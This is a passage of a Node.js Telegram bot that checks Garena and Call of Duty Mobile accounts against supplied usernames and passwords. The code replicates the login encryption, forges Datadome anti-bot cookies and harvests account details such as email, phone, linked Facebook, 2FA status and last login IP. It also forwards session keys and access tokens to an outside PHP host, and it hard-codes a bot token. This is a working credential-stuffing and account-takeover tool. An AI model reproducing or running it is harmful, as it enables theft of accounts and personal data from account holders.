// bot.js
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const { URLSearchParams, URL } = require('url'); // For URL manipulation

// --- Configuration ---
const TELEGRAM_BOT_TOKEN = "8140669360:AAGfSoSmdouoHITUGTw-0EaEJwARnEicuP8"; // <--- REPLACE WITH YOUR BOT TOKEN
const ADMIN_CHAT_ID = 6542321044; // <--- REPLACE WITH YOUR TELEGRAM USER ID (INTEGER)
const ALLOWED_CHATS_FILE = path.join(__dirname, "access.json");

const APK_URL = "https://auth.garena.com/api/login?";
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";

let ALLOWED_CHAT_IDS = new Set();

// --- Logging ---
// Basic logger, replace with Winston or similar for production
const logger = {
    info: (message) => console.log(`[INFO] ${new Date().toISOString()} - ${message}`),
    warn: (message) => console.warn(`[WARN] ${new Date().toISOString()} - ${message}`),
    error: (message, error) => console.error(`[ERROR] ${new Date().toISOString()} - ${message}`, error || ''),
    debug: (message) => console.log(`[DEBUG] ${new Date().toISOString()} - ${message}`),
};

// --- Access Control ---
function loadAllowedChats() {
    try {
        if (fs.existsSync(ALLOWED_CHATS_FILE)) {
            const data = fs.readFileSync(ALLOWED_CHATS_FILE, 'utf-8');
            const parsedData = JSON.parse(data);
            if (!Array.isArray(parsedData)) {
                logger.error(`${ALLOWED_CHATS_FILE} does not contain a JSON list.`);
                parsedData = []; // Fallback to empty
            }
            ALLOWED_CHAT_IDS = new Set(parsedData.map(id => parseInt(id, 10)).filter(id => !isNaN(id)));
            logger.info(`Loaded ${ALLOWED_CHAT_IDS.size} valid chat IDs from ${ALLOWED_CHATS_FILE}`);
        } else {
            logger.warn(`${ALLOWED_CHATS_FILE} not found. Creating an empty one.`);
            let initialData = [];
            if (ADMIN_CHAT_ID && Number.isInteger(ADMIN_CHAT_ID)) {
                initialData = [ADMIN_CHAT_ID];
                ALLOWED_CHAT_IDS = new Set([ADMIN_CHAT_ID]);
                logger.info(`Added Admin ID ${ADMIN_CHAT_ID} to new ${ALLOWED_CHATS_FILE}`);
            } else {
                logger.warn(`ADMIN_CHAT_ID is not set or invalid. The access file was created empty.`);
                ALLOWED_CHAT_IDS = new Set();
            }
            fs.writeFileSync(ALLOWED_CHATS_FILE, JSON.stringify(initialData, null, 2));
        }
    } catch (e) {
        logger.error(`Error loading or parsing ${ALLOWED_CHATS_FILE}:`, e);
        ALLOWED_CHAT_IDS = new Set();
        if (ADMIN_CHAT_ID && Number.isInteger(ADMIN_CHAT_ID)) {
            ALLOWED_CHAT_IDS.add(ADMIN_CHAT_ID); // Ensure admin has access if file fails
            try {
              fs.writeFileSync(ALLOWED_CHATS_FILE, JSON.stringify([ADMIN_CHAT_ID], null, 2));
              logger.info('Re-initialized access file with Admin ID due to load error.');
            } catch (writeErr) {
              logger.error('Failed to re-initialize access file.', writeErr);
            }
        }
    }
}

// Using sync file operations for simplicity, as these are admin commands (less frequent)
// For high-concurrency, an async queue or proper async file lock would be better.
function modifyAccessList(chatIdToModify, action = "add") {
    if (!Number.isInteger(chatIdToModify)) {
        logger.error(`[Access] Invalid chat ID type: ${typeof chatIdToModify}. Must be integer.`);
        return false;
    }

    let currentIdsArray = [];
    try {
        if (fs.existsSync(ALLOWED_CHATS_FILE)) {
            const data = fs.readFileSync(ALLOWED_CHATS_FILE, 'utf-8');
            const parsed = JSON.parse(data);
            if (Array.isArray(parsed)) {
                currentIdsArray = parsed.map(id => parseInt(id, 10)).filter(id => !isNaN(id));
            } else {
                 logger.warn(`[Access] ${ALLOWED_CHATS_FILE} was not a list. Re-initializing.`);
                 currentIdsArray = (ADMIN_CHAT_ID && Number.isInteger(ADMIN_CHAT_ID)) ? [ADMIN_CHAT_ID] : [];
            }
        } else {
            currentIdsArray = (ADMIN_CHAT_ID && Number.isInteger(ADMIN_CHAT_ID)) ? [ADMIN_CHAT_ID] : [];
        }
    } catch (e) {
        logger.error(`[Access] Error reading ${ALLOWED_CHATS_FILE} before modification: ${e}. Re-initializing.`);
        currentIdsArray = (ADMIN_CHAT_ID && Number.isInteger(ADMIN_CHAT_ID)) ? [ADMIN_CHAT_ID] : [];
    }
    
    const currentIdsSet = new Set(currentIdsArray);
    let modified = false;

    if (action === "add") {
        if (!currentIdsSet.has(chatIdToModify)) {
            currentIdsSet.add(chatIdToModify);
            modified = true;
            logger.info(`[Access] Added chat ID ${chatIdToModify}.`);
        } else {
            logger.info(`[Access] Chat ID ${chatIdToModify} already exists.`);
            return true; // Considered success
        }
    } else if (action === "remove") {
        if (currentIdsSet.has(chatIdToModify)) {
            currentIdsSet.delete(chatIdToModify);
            modified = true;
            logger.info(`[Access] Removed chat ID ${chatIdToModify}.`);
        } else {
            logger.info(`[Access] Chat ID ${chatIdToModify} not found for removal.`);
            return false; // Indicate not found
        }
    } else {
        logger.error(`[Access] Unknown action: ${action}`);
        return false;
    }

    if (modified) {
        try {
            const sortedIds = Array.from(currentIdsSet).sort((a, b) => a - b);
            fs.writeFileSync(ALLOWED_CHATS_FILE, JSON.stringify(sortedIds, null, 2));
            ALLOWED_CHAT_IDS = new Set(sortedIds); // Update global set
            logger.info(`[Access] Current allowed count: ${ALLOWED_CHAT_IDS.size}`);
            return true;
        } catch (e) {
            logger.error(`[Access] Failed to write updated access list to ${ALLOWED_CHATS_FILE}:`, e);
            loadAllowedChats(); // Re-load to be safe
            return false;
        }
    }
    return true; // If not modified but action was valid (e.g. add existing)
}

const addChatIdToAccess = (chatIdToAdd) => modifyAccessList(chatIdToAdd, "add");
const removeChatIdFromAccess = (chatIdToRemove) => modifyAccessList(chatIdToRemove, "remove");
const isUserAllowed = (chatId) => ALLOWED_CHAT_IDS.has(parseInt(chatId, 10));
const isAdmin = (chatId) => Number.isInteger(ADMIN_CHAT_ID) && parseInt(chatId, 10) === ADMIN_CHAT_ID;

// --- Helper Functions ---
function getCurrentTimestamp() {
    return String(Math.floor(Date.now() / 1000));
}

function generateMd5Hash(password) {
    return crypto.createHash('md5').update(password, 'utf-8').digest('hex');
}

function generateDecryptionKey(passwordMd5, v1, v2) {
    const intermediateHash = crypto.createHash('sha256').update(passwordMd5 + v1, 'utf-8').digest('hex');
    return crypto.createHash('sha256').update(intermediateHash + v2, 'utf-8').digest('hex');
}

function encryptAes256Ecb(plaintextHex, keyHex) {
    const key = Buffer.from(keyHex, 'hex');
    let plaintextBytes = Buffer.from(plaintextHex, 'hex');

    const blockSize = 16; // AES block size
    const paddingLength = blockSize - (plaintextBytes.length % blockSize);
    const padding = Buffer.alloc(paddingLength, paddingLength); // PKCS#7 style padding
    plaintextBytes = Buffer.concat([plaintextBytes, padding]);

    const cipher = crypto.createCipheriv('aes-256-ecb', key, null); // null IV for ECB
    cipher.setAutoPadding(false); // We did manual padding

    let encrypted = cipher.update(plaintextBytes, null, 'hex');
    // final() should be empty if autoPadding is false and input is block-aligned
    // However, to be safe, include it, though it might not add anything.
    const finalPart = cipher.final('hex'); 
    if (finalPart) encrypted += finalPart;
    
    return encrypted.substring(0, 32); // Match Python's truncation
}


function getEncryptedPassword(password, v1, v2) {
    const passwordMd5 = generateMd5Hash(password);
    const decryptionKey = generateDecryptionKey(passwordMd5, v1, v2);
    return encryptAes256Ecb(passwordMd5, decryptionKey);
}

async function getDatadomeCookie() {
    const url = 'https://dd.garena.com/js/';
    const headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    };
    const payload = {
        'jsData': JSON.stringify({"ttst": Math.floor(Math.random() * 100) + 50, "hc": Math.floor(Math.random() * 7) + 2, "br_oh":1080, "br_ow":1920}),
        'eventCounters': '[]',
        'jsType': 'ch',
        'ddv': '4.35.4',
        'Referer': 'https://account.garena.com/',
        'request': '%2F',
        'responsePage': 'origin',
    };
    // In Node.js, URLSearchParams is good for x-www-form-urlencoded
    const data = new URLSearchParams(payload).toString();

    try {
        const response = await axios.post(url, data, { headers, timeout: 15000 });
        if (response.data && response.data.cookie) {
            const cookieString = response.data.cookie;
            const match = cookieString.match(/datadome=([^;]+)/);
            if (match) return match[1];
        }
        logger.warn(`Datadome response did not contain expected cookie: ${JSON.stringify(response.data)}`);
        return null;
    } catch (e) {
        logger.error(`Failed to get Datadome cookie:`, e.message);
        return `[⚠️] Datadome Error: ${e.message}`;
    }
}

// Simplified version of Python's get_request_data
// Assumes change_cookie.py is not essential or its output is minimal
function getRequestData() {
    const cookies = {}; // Start with empty cookies, datadome will be added
    const headers = {
        'Host': 'auth.garena.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua-platform': '"Android"',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + encodeURIComponent(REDIRECT_URL),
        'Accept-Encoding': 'gzip, deflate, br, zstd', // axios handles gzip by default
        'Accept-Language': 'en-US,en;q=0.9'
    };
    return { cookies, headers };
}

function formatResultDict(last_login, last_login_where, country, shell_str, avatar_url, mobile,
                       facebook_bound_str, email_verified_str, authenticator_enabled_str, two_step_enabled_str,
                       connected_games_data, is_clean_bool, fb_name, fb_link, email, date,
                       username, password, ckz_count, last_login_ip, account_status) {
    let codm_info_json = {"status": "No CODM Info Received"};
    if (connected_games_data && connected_games_data.length > 0) {
        const game_data = connected_games_data[0];
        if (game_data.game === "CODM") {
            let level_val = parseInt(game_data.level, 10);
            if (isNaN(level_val)) level_val = game_data.level;

            codm_info_json = {
                "status": "Linked", "game": "CODM",
                "region": game_data.region || null,
                "level": level_val,
                "nickname": game_data.nickname || null,
                "uid": game_data.uid || null
            };
        }
    }

    let shell_value = parseInt(shell_str, 10);
    if (isNaN(shell_value)) shell_value = 0;

    const mobile_bound_bool = mobile !== "N/A" && !!mobile;
    const email_verified_bool = email_verified_str === "True";
    const facebook_linked_bool = facebook_bound_str === "True";
    const authenticator_enabled_bool = authenticator_enabled_str === "True";
    const two_step_enabled_bool = two_step_enabled_str === "True";

    const cleanNa = (value) => (value === "N/A" || value === null || value === "") ? null : value;

    return {
        "checker_by": "@YISHUX",
        "timestamp_utc": new Date().toISOString(),
        "check_run_id": date,
        "username": username,
        "password": password,
        "account_status": account_status,
        "is_clean": is_clean_bool, // Added this for easier check in bot reply
        "account_country": cleanNa(country),
        "garena_shells": shell_value,
        "avatar_url": cleanNa(avatar_url),
        "last_login_time": cleanNa(last_login),
        "last_login_location": cleanNa(last_login_where),
        "last_login_ip": cleanNa(last_login_ip),
        "bindings": {
            "mobile_number": cleanNa(mobile),
            "email_address": cleanNa(email),
            "facebook_name": cleanNa(fb_name),
            "facebook_link": cleanNa(fb_link),
        },
        "security": {
            "mobile_bound": mobile_bound_bool,
            "email_verified": email_verified_bool,
            "facebook_linked": facebook_linked_bool,
            "google_authenticator_enabled": authenticator_enabled_bool,
            "two_step_verification_enabled": two_step_enabled_bool,
        },
        "codm_details": codm_info_json,
        "ckz_count": ckz_count !== "UNKNOWN" ? ckz_count : null,
    };
}


async function showLevel(accessToken, selectedHeader, cookiesForCodm) {
    const url = "https://auth.codm.garena.com/auth/auth/callback_n";
    const params = { "site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": accessToken };
    const headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": selectedHeader["User-Agent"] || "Mozilla/5.0",
        ...(Object.fromEntries(Object.entries(selectedHeader).filter(([k]) => k.toLowerCase().startsWith('sec-ch-ua'))))
    };

    let cookieString = "";
    if (cookiesForCodm) {
        cookieString = Object.entries(cookiesForCodm).map(([k, v]) => `${k}=${v}`).join('; ');
    }
    if (cookieString) headers['Cookie'] = cookieString;
    
    try {
        let response = await axios.get(url, { headers, params, timeout: 30000, maxRedirects: 0, validateStatus: status => status < 500 }); // Handle redirects manually

        let redirectCount = 0;
        while ([301, 302, 307, 308].includes(response.status) && redirectCount < 5) {
            const redirectUrl = response.headers.location;
            if (!redirectUrl) return "[CODM FAIL] Redirect detected but no Location header found.";
            
            logger.debug(`Following redirect to: ${redirectUrl}`);
            // Update cookies from 'set-cookie' headers if any
            if (response.headers['set-cookie']) {
                 response.headers['set-cookie'].forEach(cookie => {
                    const [name, value] = cookie.split(';')[0].split('=');
                    cookiesForCodm[name] = value;
                 });
                 headers['Cookie'] = Object.entries(cookiesForCodm).map(([k, v]) => `${k}=${v}`).join('; ');
            }
            response = await axios.get(redirectUrl, { headers, timeout: 30000, maxRedirects: 0, validateStatus: status => status < 500 });
            redirectCount++;
        }
        
        if (response.status >= 400) {
             return `[CODM FAIL] Callback request error: Status ${response.status}`;
        }

        const finalUrl = response.request.res.responseUrl || response.config.url; // Get final URL
        const parsedUrl = new URL(finalUrl);
        let extractedToken = parsedUrl.searchParams.get("token");

        if (!extractedToken && response.data) {
            const match = response.data.toString().match(/["']token["']\s*:\s*["'](.*?)["']/);
            if (match) extractedToken = match[1];
        }

        if (!extractedToken) {
            logger.warn(`CODM Token Extraction Failed. Final URL: ${finalUrl}, Status: ${response.status}, Body Snippet: ${response.data.toString().substring(0, 200)}`);
            return `[CODM FAIL] Could not extract CODM token from callback.`;
        }

        const externalCodmScript = "https://suneoxjarell.x10.bz/jajac.php";
        const payloadForScript = {
            "user_agent": selectedHeader["User-Agent"],
            "extracted_token": extractedToken
        };

        const responseCodm = await axios.post(externalCodmScript, payloadForScript, { headers: {"Content-Type": "application/json"}, timeout: 45000 });
        const responseText = responseCodm.data.toString().trim();

        if (responseText.includes("|") && responseText.split("|").length === 4) {
            const parts = responseText.split("|");
            if (!isNaN(parseInt(parts[1])) && parts.every(p => p)) {
                return responseText;
            } else {
                return `[CODM WARN] Script returned parsable data, but parts invalid: ${responseText.substring(0, 100)}`;
            }
        } else {
            if (responseText.toLowerCase().includes("not found") || responseText.toLowerCase().includes("invalid token")) {
                return `[CODM FAIL] Account likely not linked to CODM or token invalid.`;
            } else if (responseText.toLowerCase().includes("error") || responseText.toLowerCase().includes("fail")) {
                return `[CODM FAIL] Script reported an issue: ${responseText.substring(0, 150)}`;
            } else {
                return `[CODM WARN] Script returned unexpected data format: ${responseText.substring(0, 100)}`;
            }
        }
    } catch (e) {
        logger.error(`[CODM ShowLevel Error]`, e.message);
        if (e.code === 'ECONNABORTED' || (e.response && e.response.status === 408) ) return "[⏱️] [CODM FAIL] CODM callback request timed out.";
        return `[CODM FAIL] Callback request error: ${e.message}`;
    }
}


async function checkLogin(accountUsername, _id, encryptedPassword, originalPassword, selectedHeader, initialCookies, dataa, date) {
    let currentCookies = { ...initialCookies };
    if (dataa) {
        currentCookies["datadome"] = dataa;
    } else {
        const manualDatadomeResult = await getDatadomeCookie();
        if (typeof manualDatadomeResult === 'string' && manualDatadomeResult.startsWith("[⚠️]")) {
            return manualDatadomeResult;
        } else if (manualDatadomeResult) {
            currentCookies["datadome"] = manualDatadomeResult;
        } else {
            logger.warn("Failed to obtain Datadome cookie automatically.");
            // Potentially return "[❌] Failed to obtain Datadome cookie."
        }
    }
    
    const loginParams = new URLSearchParams({
        'app_id': '100082', 'account': accountUsername, 'password': encryptedPassword,
        'redirect_uri': REDIRECT_URL, 'format': 'json', 'id': _id,
    });
    const loginUrl = APK_URL + loginParams.toString();

    let loginResponse;
    try {
        let cookieString = Object.entries(currentCookies).map(([k, v]) => `${k}=${v}`).join('; ');
        const reqHeaders = {...selectedHeader};
        if(cookieString) reqHeaders['Cookie'] = cookieString;

        loginResponse = await axios.get(loginUrl, { 
            headers: reqHeaders, 
            timeout: 30000,
            // Axios by default follows redirects. Garena flow might rely on specific cookie setting during redirects.
            // For full control, you might set maxRedirects: 0 and handle them manually.
            // But requests library in Python follows redirects by default.
        });

    } catch (e) {
        if (e.code === 'ECONNREFUSED') return "[🔴] Connection error - Server refused";
        if (e.code === 'ECONNABORTED' || (e.response && e.response.status === 408)) return "[⏱️] Login Timeout";
        if (e.response) {
            const { status, data } = e.response;
            const respTextClean = data ? data.toString() : "";
            if (status === 403) return "[🚫] Login Forbidden (403)";
            if (status === 429) return "[🚦] Rate Limited (429)";
            if (respTextClean.toLowerCase().includes("captcha")) return "[🤖] CAPTCHA Detected";
            logger.warn(`Login HTTP Error ${status} for ${accountUsername}: ${respTextClean.substring(0, 200)}`);
            return `[📉] Login HTTP Error ${status}`;
        }
        return `[⚠️] Login Request Failed: ${e.message}`;
    }

    const loginJson = loginResponse.data; // Axios automatically parses JSON if Content-Type is application/json
    if (typeof loginJson !== 'object') {
         if (loginResponse.data && loginResponse.data.toString().toLowerCase().includes("captcha")) return "[🤖] CAPTCHA Detected";
         logger.warn(`Invalid Login JSON for ${accountUsername}: ${loginResponse.data.toString().substring(0,200)}`);
         return `[💢] Invalid Login JSON Response`;
    }

    if (loginJson.error) {
        const errorMsg = loginJson.error;
        if (errorMsg.includes("error_password")) return "[⛔] Incorrect password";
        if (errorMsg.includes("error_account_does_not_exist")) return "[👻] Account doesn't exist";
        if (errorMsg.includes("error_account_not_activated")) return "[⏳] Account not activated";
        if (errorMsg.includes("error_captcha")) return "[🤖] CAPTCHA Required (Login)";
        return `[🚫] Login Error: ${errorMsg}`;
    }
    if (!loginJson.session_key) {
         logger.warn(`Login response missing session_key for ${accountUsername}: ${JSON.stringify(loginJson)}`);
         return "[❌] Login Failed: No session key received";
    }

    const sessionKey = loginJson.session_key;
    // Extract sso_key from Set-Cookie headers
    let ssoKey = null;
    if (loginResponse.headers['set-cookie']) {
        loginResponse.headers['set-cookie'].forEach(cookie => {
            if (cookie.startsWith('sso_key=')) {
                ssoKey = cookie.split(';')[0].split('=')[1];
            }
        });
    }
    
    const cokeForPhp = { ...currentCookies }; // Use a copy
    if (ssoKey) cokeForPhp["sso_key"] = ssoKey;


    const hiderForPhp = {
        'Host': 'account.garena.com',
        'Connection': 'keep-alive',
        'User-Agent': selectedHeader["User-Agent"] || "Mozilla/5.0",
        'Accept': 'application/json, text/plain, */*',
        'Referer': `https://account.garena.com/?session_key=${sessionKey}`,
        'Accept-Language': 'en-US,en;q=0.9',
        ...(Object.fromEntries(Object.entries(selectedHeader).filter(([k]) => k.toLowerCase().startsWith('sec-ch-ua'))))
    };

    const initUrl = 'https://suneoxjarell.x10.bz/jajak.php';
    const phpParams = new URLSearchParams();
    for (const [k, v] of Object.entries(cokeForPhp)) phpParams.append(`coke_${k}`, v);
    for (const [k, v] of Object.entries(hiderForPhp)) {
        const safeK = k.replace(/-/g, '_').toLowerCase();
        phpParams.append(`hider_${safeK}`, v);
    }
    
    let initJsonResponse;
    try {
        const initResponse = await axios.get(initUrl, { params: phpParams, timeout: 60000 });
        const cleanedInitText = initResponse.data.toString().trim();
        if (cleanedInitText.startsWith('{') && cleanedInitText.endsWith('}')) {
            initJsonResponse = JSON.parse(cleanedInitText);
        } else {
            const jsonMatch = cleanedInitText.match(/({.*?})/s); // s for DOTALL
            if (jsonMatch) initJsonResponse = JSON.parse(jsonMatch[1]);
            else {
                logger.warn(`Failed to parse account info response (Not JSON) for ${accountUsername}: ${cleanedInitText.substring(0, 200)}`);
                return `[🧩] Failed to parse account info response (Not valid JSON)`;
            }
        }
    } catch (e) {
        if (e.code === 'ECONNABORTED') return "[⏱️] Account info script timeout";
        return `[📡] Account info script request failed: ${e.message}`;
    }


    if (initJsonResponse.error || initJsonResponse.success === false) { // PHP script might use success: false
        const errorDetail = initJsonResponse.error || initJsonResponse.message || 'Unknown Error from PHP';
        return `[❓] Account info error: ${errorDetail.toString()}`;
    }

    const bindings = initJsonResponse.bindings || [];
    const account_status_raw = (initJsonResponse.status || 'Unknown').toString();
    let country = "N/A", last_login = "N/A", last_login_where = "N/A", avatar_url = "N/A";
    let fb_name = "N/A", fb_link = "N/A", mobile = "N/A", email = "N/A";
    let facebook_bound = "False", email_verified = "False", authenticator_enabled = "False", two_step_enabled = "False";
    let shell = "0", ckz_count = "UNKNOWN", last_login_ip = "N/A";

    bindings.forEach(binding_raw => {
        const binding_clean = binding_raw.toString();
        const extractValue = (key) => binding_clean.includes(key) ? binding_clean.split(key)[1].trim() : null;

        let val;
        if ((val = extractValue("Country:"))) country = val;
        else if (binding_clean.includes("LastLogin:") && !binding_clean.includes("From:") && !binding_clean.includes("IP:")) last_login = extractValue("LastLogin:");
        else if ((val = extractValue("LastLoginFrom:"))) last_login_where = val;
        else if ((val = extractValue("ckz:"))) ckz_count = val;
        else if ((val = extractValue("LastLoginIP:"))) last_login_ip = val;
        else if (binding_clean.includes("Garena Shells:")) {
            const shellPart = extractValue("Garena Shells:");
            const shellMatch = shellPart ? shellPart.match(/(\d+)/) : null;
            shell = shellMatch ? shellMatch[1] : "0";
        }
        else if (binding_clean.includes("Facebook Account:")) {
            const fbNameRaw = extractValue("Facebook Account:");
            if (fbNameRaw && fbNameRaw !== "N/A") { fb_name = fbNameRaw; facebook_bound = "True"; }
        }
        else if ((val = extractValue("Fb link:"))) fb_link = val;
        else if ((val = extractValue("Avatar:"))) avatar_url = val;
        else if (binding_clean.includes("Mobile Number:")) {
            const mobileNumRaw = extractValue("Mobile Number:");
            if (mobileNumRaw && mobileNumRaw !== "N/A") mobile = mobileNumRaw;
        }
        else if (binding_clean.includes("tae:")) email_verified = extractValue("tae:").includes("Yes") ? "True" : "False";
        else if (binding_clean.includes("eta:")) {
            const emailRaw = extractValue("eta:");
            if (emailRaw && emailRaw !== "N/A") email = emailRaw;
        }
        else if (binding_clean.includes("Authenticator:")) authenticator_enabled = extractValue("Authenticator:").includes("Enabled") ? "True" : "False";
        else if (binding_clean.includes("Two-Step Verification:")) two_step_enabled = extractValue("Two-Step Verification:").includes("Enabled") ? "True" : "False";
    });

    // Grant Token Step
    const grantCookiesObj = {};
    if (currentCookies.datadome) grantCookiesObj.datadome = currentCookies.datadome;
    if (cokeForPhp.sso_key) grantCookiesObj.sso_key = cokeForPhp.sso_key; // Use sso_key obtained during login

    const grantHeaders = {
        "Host": "auth.garena.com", "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=" + encodeURIComponent(REDIRECT_URL),
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": selectedHeader["User-Agent"] || "Mozilla/5.0",
        ...(Object.fromEntries(Object.entries(selectedHeader).filter(([k]) => k.toLowerCase().startsWith('sec-ch-ua'))))
    };
    if (Object.keys(grantCookiesObj).length > 0) {
        grantHeaders['Cookie'] = Object.entries(grantCookiesObj).map(([k,v]) => `${k}=${v}`).join('; ');
    }

    const grantData = new URLSearchParams({
        "client_id": "100082", "response_type": "token", 
        "redirect_uri": REDIRECT_URL, "format": "json", "id": _id
    }).toString();

    try {
        const grantUrl = "https://auth.garena.com/oauth/token/grant";
        const grantResponse = await axios.post(grantUrl, grantData, { headers: grantHeaders, timeout: 30000 });
        
        const grantDataJson = grantResponse.data;
        if (typeof grantDataJson !== 'object') return "[📄] Grant token failed: Non-JSON response";
        if (grantDataJson.error) return `[🔑] Grant token failed: ${grantDataJson.error}`;
        if (!grantDataJson.access_token) return "[❓] Grant token response missing 'access_token'";

        const accessToken = grantDataJson.access_token;
        
        const codmCheckCookies = {...grantCookiesObj}; // Start with existing cookies
        // Update cookies from grantResponse if any
        if (grantResponse.headers['set-cookie']) {
            grantResponse.headers['set-cookie'].forEach(cookie => {
                const [nameValue] = cookie.split(';');
                const [name, ...valParts] = nameValue.split('=');
                const value = valParts.join('=');
                if (name && value) codmCheckCookies[name.trim()] = value.trim();
            });
        }
        // Attempt to refresh datadome
        const newDatadomeResult = await getDatadomeCookie();
        if (typeof newDatadomeResult === 'string' && newDatadomeResult.startsWith("[⚠️]")) {
             logger.warn(`Failed to refresh datadome during grant: ${newDatadomeResult}. Using previous.`);
        } else if (newDatadomeResult) {
             codmCheckCookies.datadome = newDatadomeResult;
        }


        const codmResultStr = await showLevel(accessToken, selectedHeader, codmCheckCookies);

        if (codmResultStr.startsWith(("[CODM FAIL]")) || codmResultStr.startsWith(("[CODM WARN]")) || codmResultStr.startsWith(("[⏱️]"))) {
            return { status: "CODM_FAILURE", username: accountUsername, password: originalPassword, reason: codmResultStr };
        }

        let codmNickname = "N/A", codmLevelStr = "N/A", codmRegion = "N/A", uid = "N/A";
        const connectedGamesListForJson = [];
        if (codmResultStr.includes("|") && codmResultStr.split("|").length === 4) {
            const parts = codmResultStr.split("|");
            [codmNickname, codmLevelStr, codmRegion, uid] = parts;
            if (!isNaN(parseInt(codmLevelStr)) && codmNickname && codmRegion && uid) {
                connectedGamesListForJson.push({
                    "game": "CODM", "region": codmRegion, "level": codmLevelStr,
                    "nickname": codmNickname, "uid": uid
                });
            } else {
                const reason = `[CODM WARN] Script returned parsable data, but parts invalid: ${codmResultStr.substring(0, 100)}`;
                return { status: "CODM_FAILURE", username: accountUsername, password: originalPassword, reason: reason };
            }
        } else {
            const reason = `[CODM WARN] Script returned unexpected data format: ${codmResultStr.substring(0, 100)}`;
            return { status: "CODM_FAILURE", username: accountUsername, password: originalPassword, reason: reason };
        }

        const isCleanBool = account_status_raw.toLowerCase().includes("clean");

        return formatResultDict(
            last_login, last_login_where, country, shell, avatar_url, mobile,
            facebook_bound, email_verified, authenticator_enabled, two_step_enabled,
            connectedGamesListForJson, isCleanBool, fb_name, fb_link, email, date,
            accountUsername, originalPassword, ckz_count, last_login_ip, account_status_raw
        );

    } catch (e) {
        logger.error("Error during grant token/CODM check:", e.message);
        if (e.code === 'ECONNABORTED') return "[⏱️] Grant token request timed out.";
        if (e.response) return `[🌐] Grant token request error: ${e.response.status} - ${e.response.data ? e.response.data.toString().substring(0,100) : e.message}`;
        return `[💥] Unexpected error in grant/CODM phase: ${e.message}`;
    }
}


async function checkAccount(username, password, date) {
    try {
        const randomId = String(Math.floor(Math.random() * 90000000) + 10000000) + String(Math.floor(Math.random() * 9000) + 1000);
        const { cookies: initialCookies, headers } = getRequestData(); // cookies here are mostly static based on my interpretation
        
        const params = new URLSearchParams({ "app_id": "100082", "account": username, "format": "json", "id": randomId });
        const preloginUrl = "https://auth.garena.com/api/prelogin";
        
        let preloginResponse;
        try {
            // Add datadome to initialCookies if needed, or handle inside checkLogin
            let cookieString = Object.entries(initialCookies).map(([k, v]) => `${k}=${v}`).join('; ');
            const reqHeaders = {...headers};
            if(cookieString) reqHeaders['Cookie'] = cookieString;

            preloginResponse = await axios.get(preloginUrl, { params, headers: reqHeaders, timeout: 20000 });
        } catch (e) {
            if (e.code === 'ECONNABORTED') return "[⏱️] Prelogin Timed Out";
            if (e.response) {
                const { status, data } = e.response;
                const respTextClean = data ? data.toString() : "";
                if (status === 403) return `[🚫] Prelogin Forbidden (403)`;
                if (status === 429) return "[🚦] Prelogin Rate Limited (429)";
                if (respTextClean.toLowerCase().includes("captcha")) return "[🤖] CAPTCHA Detected (Prelogin Response)";
                logger.warn(`Prelogin HTTP Error ${status} for ${username}: ${respTextClean.substring(0, 200)}`);
                return `[📉] Prelogin HTTP ${status}`;
            }
            return `[🔌] Prelogin Request Failed: ${e.message}`;
        }

        const preloginData = preloginResponse.data;
        if (typeof preloginData !== 'object') {
             if (preloginResponse.data && preloginResponse.data.toString().toLowerCase().includes("captcha")) return "[🤖] CAPTCHA Detected (Prelogin Body)";
             logger.warn(`Invalid Prelogin JSON for ${username}: ${preloginResponse.data.toString().substring(0,200)}`);
             return `[🧩] Invalid Prelogin JSON`;
        }
        
        if (preloginData.error) {
            const errorMsg = preloginData.error;
            if (errorMsg === 'error_account_does_not_exist') return "[👻] Account doesn't exist";
            if (errorMsg === 'error_captcha_required') return "[🤖] CAPTCHA Required (Prelogin Error)";
            return `[❗] Prelogin Error: ${errorMsg}`;
        }

        const { v1, v2 } = preloginData;
        if (!v1 || !v2) return "[⚠️] Prelogin Data Missing (v1/v2)";

        let datadomeCookie = null;
        if (preloginResponse.headers['set-cookie']) {
             preloginResponse.headers['set-cookie'].forEach(cookie => {
                 if (cookie.startsWith('datadome=')) {
                     datadomeCookie = cookie.split(';')[0].split('=')[1];
                 }
             });
        }
        
        const encryptedPassword = getEncryptedPassword(password, v1, v2);
        
